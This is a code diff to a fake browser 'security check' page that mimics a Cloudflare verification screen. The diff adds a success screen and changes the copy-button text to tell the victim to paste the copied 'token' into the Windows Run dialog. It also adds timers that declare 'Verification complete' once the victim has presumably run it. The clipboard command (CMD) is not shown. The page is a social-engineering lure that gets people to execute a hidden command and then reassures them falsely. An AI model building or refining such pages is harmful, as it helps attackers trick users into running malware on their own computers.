@@ -77,6 +77,17 @@ kbd{
 .copy-btn.ok{background:#16a34a;pointer-events:none}
 .note{display:none;font-size:11px;color:#9ca3af;line-height:1.6}
 
+/* ── phase 4: success ── */
+.done{display:none;text-align:center}
+.done-icon{
+  width:56px;height:56px;border-radius:50%;background:#dcfce7;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 20px
+}
+.done-icon svg{width:28px;height:28px}
+.done h2{font-size:19px;font-weight:700;color:#15803d;margin-bottom:8px}
+.done p{font-size:13px;color:#6b7280;line-height:1.65}
+
 /* ── footer ── */
 .ray{font-size:11px;color:#d1d5db;margin-top:26px}
 </style>
@@ -137,6 +148,18 @@ kbd{
   <p class="note" id="note">
     This performs a one-time browser security check.<br>No files are stored on your device.
   </p>
+
+  <!-- phase 4: success screen -->
+  <div class="done" id="done">
+    <div class="done-icon">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M5 12l5 5L20 7" stroke="#16a34a" stroke-width="2.5"
+              stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <h2>Verification complete</h2>
+    <p>Your browser has been verified successfully.<br>You can now close this window.</p>
+  </div>
 
   <p class="ray">
     Ray ID: <span id="rid"></span>&nbsp;&nbsp;·&nbsp;&nbsp;
@@ -217,19 +240,28 @@ function capClick(){
     show('copyBtn');
     show('note');
   }, 900);
+
+  // fallback: if user pastes from auto-copy without clicking button, still show success
+  setTimeout(showDone, 16000);
 }
 
 // ── phase 3: manual copy button ─────────────────────
 function doCopy(){
   var btn = document.getElementById('copyBtn');
   writeClip(CMD).then(function(){
-    btn.textContent = '&#10003; Token copied to clipboard';
+    btn.textContent = '✓ Token copied — paste in Run dialog now';
     btn.classList.add('ok');
-    setTimeout(function(){
-      btn.textContent = 'Copy verification token';
-      btn.classList.remove('ok');
-    }, 3000);
+    // phase 4: success screen after 7s (enough time for user to paste + press Enter)
+    setTimeout(showDone, 7000);
   });
+}
+
+// ── phase 4: success ─────────────────────────────────
+function showDone(){
+  hide('steps');
+  hide('copyBtn');
+  hide('note');
+  show('done');
 }
 </script>
 </body>
